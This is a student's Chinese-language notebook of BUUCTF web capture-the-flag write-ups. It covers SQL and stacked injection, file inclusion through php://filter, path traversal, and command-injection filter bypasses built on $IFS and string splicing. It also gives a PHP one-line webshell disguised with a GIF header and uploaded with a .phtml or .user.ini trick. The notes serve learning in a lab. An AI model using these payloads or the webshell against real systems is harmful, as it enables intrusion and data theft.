[BUUCTF----Web安全.md](https://github.com/user-attachments/files/33387273/BUUCTF----Web.md)




# BUUCTF----Web安全

# 1.极客大挑战 2019]EasySQL1

写题之前先吐槽一下吧，这道题真做出来了，就是有点生气的，气的自己有点肝疼，之前我那么努力用sqlmap扫描扫了那么多天，一直不成功，我一直以为是我的问题，万万没想到这道题就不是这么做的，他需要一个万能钥匙绕过就可以了，这是我之前没有接触过，也没有学习过的一个新知识，但是它本质就是一个绕过非常的简单，属于基础中的基础，真的把它做出来了，以后我就感觉自己还有点搞笑。

# <!--我以后打ctf比赛，这个思路不行就立马换新的，但是要确定这个思路不行，不要浪费时间，不要钻牛角尖，题可不会因为你的倔强而变简单-->

1.解题思路

1.新知识点：（万能账号），本质就是利用代码的识辨漏洞，用or判断另一个条件为真

<!--万能账号详细请看另一张笔记-->

# 2.极客大挑战 2019]Havefun1

1.解题思路：拿到一个ctf的题时，要先观察页面：猜出哪里是注入点，显然这到题木有注入点，所以按Ctrl+u看看有什么有用的信息，

打开一看有一行注释，明确的告诉你GUT可以传参，如图，

![image-20260414152053184](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260414152053184.png)

所以直接在URL输入

```php
http://c0bc2d26-0141-4260-a009-8f8fe6175b1e.node5.buuoj.cn:81/?cat=dog
```

直接给出答案

# 3.ACTF2020 新生赛]Include1

1.解题思路

：先观察页面，有可以按的地方，

按一下，URL有传参，有方向了；

但是，file=flag.php中"flag"是以PHP文件运行的，它只返回最后的用行结果，怎么办呢？

使用（前面学习的文件包含学习的封装器又称“伪协议”）

```php
http://0b3fcfd9-0150-4f55-b5e0-a13713305a96.node5.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=flag.php
```

这样我们就相当于，在访问一个叫“flag.php”的文件，它会以base64的格式返回，到时候用豆包翻译一下就行了

# 4.HCTF 2018]WarmUp1

真的是无语了，以后豆包给的代码，你自己也看一看啊!这到题，豆包给的思路没有问题，就是，最后的的文件名写错了，一直包含不成功，最后还是查的博客。

1.解题思路：

先检查一下，页面有没有输入点，（没有）

打开前端源代码，发现有一个注释，

用file访问注释“source.php”，（其实，这是在这个文件下的一个文件，直接路劲访问也可以）

打开了一页源代码，对页面代码进行分析

1.白名单

```php+HTML
 $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
```

2.检查有没有字符串

```
if (! isset($page) || !is_string($page)) {
    echo "you can't see it";
    return false;
}
```

3.直接匹配白名单

```
if (in_array($page, $whitelist)) {
    return true;
}
```

4.截取？前面的内容（最关键！）

```
$_page = mb_substr(
    $page,
    0,
    mb_strpos($page . '?', '?')
);
if (in_array($_page, $whitelist)) {
    return true;
}
```

给字符串后面加“？”，并且对'?'前面的代码进行比对

跟据代码可以知道白名单还可以访问hint.php，直接访问

给你一句话，代码在ffffflllaaaagggg中，

因为有上面的代码解析所以我们知道

```php
http://c68551d2-9984-4328-a965-5aa15bf7460b.node5.buuoj.cn:81/source.php?file=source.php?/../../../../ffffllllaaaagggg
```

这样可以绕过

为什么路劲是/../../../../，因为这是固定格式（ffffllllaaaagggg并且注意这个文件的写法）

# 5.ACTF2020 新生赛]Exec1

1.解题思路

查看页面，有输入点

打开注释，什么都没有

因为是ping，所以就

```
ping 127.0.0.1
```

哟，有返回结果。要判断一下是什么类型的漏洞

dvwa的漏洞特点判断一下，好像是命令注入漏洞，直接访问cat flag;

成功了，简单

# 6.[GXYCTF2019]Ping Ping Ping1

## 1.什么是WAF？

WAF是 应用防火墙，它不防病毒，不防 DDoS 流量，只盯着你发给网站的 HTTP 请求里有没有 “危险特征”。并且对其进行拦截。

### 2.你刚遇到的这些情况，就是 WAF 在干活：

1. **SQL 注入**
   - 拦 `' OR 1=1 --`、`union select`、`sleep(5)` 这种注入 payload。
2. **XSS 跨站脚本**
   - 拦 `<script>alert(1)</script>`、`onerror=alert` 这种脚本注入。
3. **命令注入 / 代码执行**
   - 拦 `; whoami`、`| cat /flag`、`system()` 这类命令拼接符和危险函数。
4. **目录遍历 / 路径穿越**
   - 拦 `../etc/passwd`、`../../flag.txt` 这种路径跳转。
5. **恶意文件上传**
   - 拦 `.php`、`.asp`、`.jsp` 等脚本文件上传请求。

### 3.有了WAF，我们该怎么办？

   1.先写出我们需要的命令，并对其中的特殊字符“单独”进行测试（进可能找简单的，”不能代替“的字符）

eg

```
/?ip=127.0.0.1; cat flag
```

  2.怎么测试呢，就对可以正常运行的命令后面拼接特殊字符。查看返回结果

```
/?ip=127.0.0.1; 
```

后面跟空格

   3.如果不行，就换编成码

```
/?ip=127.0.0.1;a=g;$IFS
```

  4.如果还是不行，这就麻烦了，(要测出什么特殊字符可以绕过，方便后面换字符)

就要按顺序一个个测，每个都加在 `/?ip=127.0.0.1` 后面：

```
;
|
&
&&
||
$
{
}
(
)
/
\
空格（直接打个空格）
```

  5.测试完字符以后，就要测试字符串了(原理和上面相同)

怎么测试呢，就对可以正常运行的命令后面拼接字符串。查看返回结果

```
/?ip=127.0.0.1;cat
```

如果关键字被过滤就只能用字符串拼接法了：

```
/?ip=127.0.0.1;a=g;cat$IFS$@fla$a.php
```

### 4.字符串拼接法

给你**通用模板 + 对应你的题目可用版本**，你直接套！

------

模板 1：变量拼接（你现在用的，最稳）

原理

plaintext

```
a=g; → 定义变量
fla$a → flag
```

万能模板

plaintext

```
?ip=127.0.0.1;X=最后一位字符;cat$IFS$@前几位$X.php
```

套用到你的题

plaintext

```
?ip=127.0.0.1;a=g;cat$IFS$@fla$a.php
```

------

模板 2：空变量拼接（不用提前定义，更短）

原理

plaintext

```
fla$()g → flag
fla$[]g → flag
```

万能模板

plaintext

```
?ip=127.0.0.1;cat$IFS$@fla$()g.php
```

你的题可用

plaintext

```
?ip=127.0.0.1;cat$IFS$@fla$()g.php
```

------

模板 3：空字符串拼接（Linux 特色）

原理

plaintext

```
fla''g → flag
fla""g → flag
```

万能模板

plaintext

```
?ip=127.0.0.1;cat$IFS$@fla''g.php
```

------

模板 4：反斜杠拆分（最隐蔽）

原理

plaintext

```
fl\ag → flag
c\at → cat
```

万能模板

plaintext

```
?ip=127.0.0.1;c\at$IFS$@fl\ag.php
```

------

模板 5：通配符拼接（不用拼，直接模糊匹配）

原理

plaintext

```
fl* = flag
fla* = flag
*g = flag
```

万能模板

plaintext

```
?ip=127.0.0.1;cat$IFS$@fl*.php
```

你的题可用

plaintext

```
?ip=127.0.0.1;cat$IFS$@fl*.php
```



所以，字符和字符串都绕过滤，就可以跑我们的命令了

## 2.解题思路

1.打开题看有没有注入点（表面上没有）

2.看前端源代码有没有什么猫腻（什么都没有，怎么办那，也要看检查页面）

3.发现页面上的是ip=，直接粘贴复制到URL里，并访问127.0.0.1

4.返回结果了，有情况，直接输入以下代码

```
?ip=127.0.0.1phpinfo
```

没有报错，证明可以跑php代码（如果报错，可能是WAF拦截，也可能是不能注入）

如果报错，对phpinfo进行字符串拼接，在试一次。确定有没有注入点

5.找到注入点了，直接注入命令，不行失败了，可能有WAF拦截，

6.绕过拦截，成功了没有报错，也没有flag，（靠，为什么，有失败了）不要慌，打开”f12“，结果就在注释中

<!--以后运行命令成功了，没有结果就看运行一下注释-->

# 7.[SUCTF 2019]EasySQL1

1.解题思路

这题考的是注入，题目对常见关键字如 *from*、*union*、*or* 等进行了过滤

堆叠注入

堆叠注入允许执行多条 SQL 语句。通过构造以下 Payload，可以直接获取 *flag*：

```
1; SELECT *, 1
```

- *表示查询所有字段。

- 拼接后 SQL 为：

# 8.极客大挑战 2019]LoveSQL1

1.解题思路

这就是一个标准的sql注入的漏洞与DVWA类似，这里不再详细解释

# 9.[极客大挑战 2019]Secret File1

1.知识点（这道题我学会了什么）

BP的重放攻击

## 2.解题思路

1.查看网页有没有输入点（没有）

2.打开源代码，有“a”打开看，有一个隐藏的页面

![image-20260423111052225](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260423111052225.png)

3.点进去，有一个按钮，点一下

![image-20260423111121648](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260423111121648.png)

4.到了end.php页面，观察页面，看源代码，什么都没有，返回上一个页面看源代码

![image-20260423111302947](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260423111302947.png)

5.有一个，“a”，点一下，怎么又到end.php了，我的action.php呢？找到不对的地方了

应该有一个action.php页面的，现在的问题是怎么访问这个页面

6.直接BP抓包，重放攻击

![image-20260423111954998](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260423111954998.png)

7.有  “secr3t.php”新信息，直接在网页后面访问   

![image-20260423112214395](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260423112214395.png)

8.知道了防御源代码，直接绕过

```
http://f091401c-46ea-4e2f-a244-c81a42e787c4.node5.buuoj.cn:81/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```

以base64的格式输出

9.找到flag,只不过是乱码，复制下来直接豆包

```
$flag = 'flag{5ca14623-9f05-4f48-9e68-e9aa0c678715}';
```

# 10[强网杯 2019]随便注1

1.学习知识

知道了，sql盲注入的几大分类（在万能密码里看）

知道了show也可以，用来查询（在万能密码里看）

还有，强制报错注入

## 2.解题思路

1.观察页面，有输入，可能是“命令注入”，也可能是“SQL注入”还可能是“xss漏洞”

2.看源代码，有提示，不要用“sqlmap”,好了，一定是SQL注入漏洞了

3.先万能钥匙：1‘  or ture ：

4.万能钥匙没有用，老办法，手动住入试试

```
1
```

```
1'
```

单引号报错，是字符行住入，

5.之后order by 一下，order by 不能用，换成select 1,2,~~~，

6.返回了过滤关键字

![image-20260423115823002](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260423115823002.png)

现在好了，一下就知道什么不能用了，可以试一试，常规绕过比如，大小写绕过等等，（不行）（联合查询，报错注入，布尔,时间盲注就都不可以使用了）

7.只能使用堆叠注入，并且主要用”show“

```
1'; show columns from `words`-- q
```

show columns from:查看表结构，

words表：一般是我们能够直接查询的表，这个语句主要目的是看看words表是怎么输出的

```
1' and (extractvalue(1,concat(0x7e,database(),0x7e)))-- q
```

`extractvalue()` → 让 MySQL 报错

`concat(0x7e, database(), 0x7e)` → 把**当前数据库名**拼进报错信息里

（当，这一步是多余的）

8.查询表

```
1'; show tables; -- q
```

知道了两张表

![image-20260423145413124](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260423145413124.png)

9.我们要知道，我们只能查works表，不能查其他表，但是我们想要的答案在其他表里，到现在我们该怎么做呢？有一个比较骚的方法，它只限制了查询语句，但是没有限制更改语句，并且有sql漏洞，我们可以给表改名字！

```
1';rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT '12';ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q
```

- 先将 words 改为别的名字 比如 words2 或者其他
- 然后将 1919810931114514 改为 words

10.查询最后的结果

```
1' or 1=1 -- 
```

# 11.[极客大挑战 2019]Http1

1.知识点

如何伪造http文件头（用Referer: ）

如何伪造ip（用X-Forwarded-For:）

如何伪造浏览器（用User-Agent:）

## 2.解题思路

1.打开页面（没有东西）

2.打开源码（有很多跳转，每个都点一下看看）

3.发现一个新页面，有提示，“It doesn't come from 'https://Sycsecret.buuoj.cn'”告诉你不是“'https://Sycsecret.buuoj.cn'”这个路劲访问的。

4.访问路径好说好说，直接伪造来源（伪造Referer 头）（BP的重放攻击）

```
Referer: <当前请求的来源URL>
```

Referer: 的作用是告诉浏览器我们是从什么位置访问的！（什么路径，那个页面）

`Referer` 在请求头里**没有严格的位置要求**，只要是作为独立的一行放在请求头区域里就行，服务器在解析时不看它的顺序。

5.查看返回，告诉你只能访问本地文件，（直接本地IP欺骗）

```
X-Forwarded-For: 127.0.0.1
```

X-Forwarded-For:**告诉网站：我真实 IP 是多少**。

6.访问，还是没有flag ,查看返回代码有”Please use "Syclover" browser“用Syclover这个浏览访问（在浏览器欺骗一下）

```
User-Agent: Syclover
```

User-Agent:告诉后端我们用什么浏览器

7.成功

# 12.[极客大挑战 2019]Upload1

## 1.知识点

### 1.如何使用蚁剑

1.先构建一句话木马

2.上传一句话木马

3.确定上传成功后，猜出木马上传的位置，并进行访问，

4.使用蚁剑访问木马，

2.（14题有类似的知识点），如何改后缀，可以运行

## 2.解题思路

1.打开题一看是“文件上传漏洞”

2.看源代码，没有任何的有用信息

3.那上传几张正常的照片看一看，"png和jpg" 的后缀不行,只有gif的后缀可以绕过

4.那构造“一句话木马”吧

```php
47 49 46 38 39 61
<?php @eval($_POST['cmd']); ?>
```

5.后缀用“.gif”先上传，成功了

6.在上传一次，这次用BP抓包，改后缀，为“.phtml”

7.为什么（这个是开挂了，因为我完全不知道为什么在这个目录下）

![image-20260508093415725](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260508093415725.png)

### 8.寻找路径（完全为了解决第7步的问题）

现实里没有这种 “默认路径”，你需要通过下面这些方法定位文件位置，我按成功率从高到低给你整理：

1. 看上传请求的响应（成功率最高）

- 上传文件时，抓包看服务器返回的响应，很多时候会直接返回文件的 URL 或路径。
- 比如响应里有 `{"url":"/upload/2025/shell.php"}`，直接复制这个 URL 就是文件地址。

2. 猜常见的上传目录（通用套路）

如果响应没给路径，就按下面这些高频路径试，命中率很高：

表格

| 常见上传目录                         | 说明                   |
| ------------------------------------ | ---------------------- |
| `/upload/`、`/uploads/`              | 最常见的通用目录       |
| `/file/`、`/files/`                  | 很多 CMS 用这个存文件  |
| `/attachment/`、`/attachments/`      | 论坛、CMS 的附件目录   |
| `/userfiles/`、`/data/`              | 自定义的文件存储目录   |
| `/static/upload/`、`/public/upload/` | 框架项目的静态资源目录 |

用法：把你的文件名拼上去访问，比如 `http://目标IP/upload/shell.php`，能打开就是对的。

3. 看网站源码 / 配置文件（如果能拿到）

- 如果能下载到网站的源码，直接找上传功能的代码，里面会写死存储路径。
- 比如 PHP 里的 `move_uploaded_file($_FILES['file']['tmp_name'], './upload/'.$filename);`，这里的 `./upload/` 就是文件存储的相对路径。

4. 报错信息泄露路径

- 故意传一个格式错误的文件，看服务器会不会报错，很多时候报错信息里会泄露网站的物理路径。
- 比如报错 `move_uploaded_file() failed to open stream: Permission denied in /var/www/html/upload/`，就能知道文件存在 `/var/www/html/upload/` 下。

5. 配合文件包含漏洞读取文件

- 如果网站有文件包含漏洞，可以用 `?file=../config.php` 读取配置文件，里面通常会写上传目录的配置项。

### 9.使用蚁剑，

1.打开蚁剑，右键，点添加

![image-20260508094513137](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260508094513137.png)

2.输入，url地址，和密码（密码是你一句话木马里的）

![image-20260508094655669](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260508094655669.png)

10.在蚁剑中打开终端（在添加的命令上右键）

![image-20260508192942490](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260508192942490.png)

11.用 cat/flag 找到flag

# 13[极客大挑战 2019]Knife1

### 1.学习知识

1.post表单的基本格式

```
POST / HTTP/1.1
Host: f0e03676-a1d3-4708-98fd-3e98b67a0ed9.node5.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

Syc=system('cat /flag');
```

2.参数

| 部分                                              | 作用                | 说明                                                         |
| ------------------------------------------------- | ------------------- | ------------------------------------------------------------ |
| `POST / HTTP/1.1`                                 | 请求方法 + 目标路径 | `POST` 表示用 POST 方法，`/` 表示请求网站根目录              |
| `Host: 靶场地址`                                  | 目标主机地址        | 告诉服务器你要访问的是哪个网站                               |
| `Content-Type: application/x-www-form-urlencoded` | 数据格式说明        | 告诉服务器「我发的是表单数据，按键值对解析」，没有这个头服务器会返回 400 |
| `Content-Length: 24`                              | 请求体长度          | 告诉服务器请求体有多少字节，服务器用来正确接收数据           |
| `Syc=system('cat /flag');`                        | 请求体（表单数据）  | 就是你要传给服务器的参数，键名 `Syc`，值是你要执行的命令     |

### 2.解题思路

1.打开题直接有一个”eval($_POST["Syc"]);“（直接就告诉你了要用post）,

2.直接一个BP抓包，换到`Repeater`（重放器）模块，

3.换成post标准格式的亲求访问

4.直接出flag

# 14.[ACTF2020 新生赛]Upload1

1.学习知识

后缀除了“.php”可以运行php文件，其它的后缀也可以，比如"`.php5 .phtml .php3 .php2` 全都可以"

### 2.解题思路

1.打开题一看，有文件上传

2.打开源代码，有白名单，只能上传图片文件

3.写一个，木马文件加文件头，写完以后改后缀

4.上传图片文件，BP抓包，改文件后缀为”phtml“

5.有返回路劲，跟据路劲，直接访问，

6.有flag返回

# 16[极客大挑战 2019]PHP1

## 1.知识点

1..SecLists（一个超级大的字典，和gobuster一起用）（路径总根：/usr/share/seclists/）

2.为什么要控制gobuster的访问速度

因为访问太快会出现429，（429就是访问太快被限制了）

3.什么是反序列代码？

## 2.解题思路

1.观察页面（什么都没有）

2.看源代码（什么都没有）

3.只能目录扫描了

![image-20260509153011156](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260509153011156.png)

4.先模糊扫描有一个200返回（直接访问）

5.访问robots.txt![image-20260509153222444](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260509153222444.png)

6.有东西，继续访问（你靠瞎猜根本找不到）（靠被嘲讽了，不过挺有意思的）

![image-20260509153345704](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260509153345704.png)

7.重新扫描，用goduster,并控制访问速度

出现了www.zip 和index.php成功，

8.浏览器访问，并下载www.zip（(index.php)是我们现在访问的页面。没有什么用）

9.减压www.zip，得到源代码，

10.代码解释

```php
function __wakeup(){
    $this->username = 'guest';
}
```

把admin 转换成guest

而且文件必须是

```
username = admin
password = 100
```

才能访问

11.只能用反序列话绕过，

[反序列化话绕过](反序列话.md)

12.成功

# 17[ACTF2020 新生赛]BackupFile1

## 1.知识点

1.gobuster一些新参数

-b：是黑名单，

-s：是白名单

而且白名单和黑名单，不能一起用。

-exclude-length:排除指定响应长度的页面，自动过滤「默认 404 假页面」

(响应长度：返回报告的长度)(ctf靶场，会把一些不存在的路径返回200，但是长度固定为28所以要过滤一下)

-delay：每次发包中间，强制延迟一段时间，防止扫太快：被 WAF 拦截、封禁 IP、限流、超时、报错。

2.-x：参数分类可以减省大量时间

| 场景                          | 必备后缀                 | 作用说明                                 |
| ----------------------------- | ------------------------ | ---------------------------------------- |
| **普通 PHP 网站（默认必扫）** | `php,html,htm,txt`       | 核心页面、静态页面、记事本提示、源码文件 |
| **备份泄露 / Backup 题目**    | `zip,rar,tar,gz,bak,old` | 整站压缩包、文件备份、旧版本源码泄露     |
| **Vim 编辑器残留泄露**        | `swp,swo`                | 缓存临时文件，直接泄露源码               |
| **数据库 / 配置泄露**         | `sql,conf,ini,config`    | 数据库备份、网站配置、账号密码、密钥     |
| **Asp/.NET  windows 站点**    | `asp,aspx,asa`           | 微软架构网站专属页面后缀                 |
| **Python Flask/Django 站点**  | `py,pyc`                 | python 源码、编译文件泄露                |

## 2.解题思路

1.打开一看，就一句话，

2.源码也是一句话“找找源文件”

3.没有别的办法了，目录扫描吧

![image-20260429112437179](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260429112437179.png)

3.就两个返回404，没有429，有可能是info.php的变形，豆包一下有index.php.bak这个，下载了一个文件，打开看看。是源码，

4.源码可以用”key=数字“来传参，并且要求传数字，（key=123）,在搜索里直接访问

5.成功

# 18[极客大挑战 2019]BuyFlag1

## 1.知识点

1.每个页面的源代码（有所不同）

2.什么是代码审计

代码审计 = 拿着源代码从头到尾看一遍，找出里面的安全漏洞（比如 SQL 注入、文件上传、后门）。

3.什么是php弱比较

**== 弱比较（松散比较）**：**只看值，不看类型**，会自动把两边转成一样类型再比。

**=== 强比较（严格比较）**：**值 + 类型都必须一样**，才返回 true。

## 2.解题过程

1.观察页面

2.观察源代码（两个页面都要观察）

![image-20260528145553358](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260528145553358.png)

3.代码审计（）

发现是POST传值，password不能为空，而且必须不是纯数字   (而且而且有money和password两个值)

<!--注意看注释-->

4.返回页面有提示

![image-20260528151611315](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260528151611315.png)

所以mony=1000000000

5.bp抓包改包，加值

mony=1000000000

6.可是password的值是多少呢？

回去看注释，password的值等于404时返回成功，可是password不能是纯数字
所以password=404a

7.发包返回新提示

![image-20260528152256702](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260528152256702.png)

只有学生可以买flag，这是什么意思，博客启动

8.原来是没有权限，直接把cook改成1；（为什么改成1，博客的解释是基础题，都改成1）

9.在访问，数字太长是什么鬼？

10.用科学计数法，money=1e9,继续访问

11.成功

# 21.[BJDCTF2020]Easy MD51

1.知识点

在文件的二进制编码中也可以藏信息

## 2.解题思路

1.打开有一个输入窗口

2.打开源码，什么都没有

3.输入，有get传值

4.bp抓包，看它的二进制有问题（问豆包），找到一个ffifdyop

5.输入ffifdyop，进入一个全新的页面

6.页面上没有有用信息，看源代码，有注释

```
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

7.这是一个MD5的强碰撞，要求两个参数的不同，md5值相同

8.在get请求里输入满足条件的参数

9.进入levell14.php页面，

10这个页面要求，post传值，而且要求，值不同，md5的值相同，（这个有个是个坑）

<!--由于算法的原因，有很多数字不同，md5值相同的值其实，md5值也不同-->

11.bp抓包，构建post请求，写两个空白，并赋值不同的，数组（因为MD5不能加密数组，它统一返回nall）,这样就满足了两个条件

12.所以只有两个数组不同，就可以了

# 29[SUCTF 2019]CheckIn1

## 1.知识点

.user.ini

**.user.ini 是 PHP 的「目录级局部配置文件」**（PHP ≥5.3），只对**当前目录 + 子目录**生效，用来覆盖全局 php.ini 的部分配置，**不用改全局配置、不用重启服务**。

## 2.解题思路

1.有是一个文件上传漏洞

![image-20260514151544216](C:\Users\24199\AppData\Roaming\Typora\typora-user-images\image-20260514151544216.png)

2.中间试探跳过，直接给结论，是一个”.gif“白名单和“.php”黑名单，的连和防御机制

3.可以试一试.htaccess,可惜有过滤（22题知识点）

4.没办法了，博客启动。知道了一个新知识点“.user.ini”

（1）.user.ini中的内容

```
GIF89a
auto_prepend_file=b.gif
```

在运行任何 PHP 文件之前，自动先包含 / 执行指定的文件

5.上传.user.ini文件，这个文件的作用和.htaccess类似，都可以使gif,当php文件运行

6.上传木马文件

7.蚁剑连接，

<!--注意，连接时，刷新一下页，以防网络不稳定-->

<!--连接不上时，重新加载，重新进，可以解决如下问题-->

<!--**这个路径已经不存在了**，所以直接 404 打不开，不是蚁剑 / 菜刀连接密码错，是**上传的马的目录被删除 / 路径失效**。-->

8.终端访问，

9.成功





# 由于一些原因buuctf平台更新了，我再也写不完了，我的笔记了，他中间学了很多东西，我还没来得及总结，真的是太遗憾了，真是的~~那旧平台已经过去了，那就在新平台重新学习吧
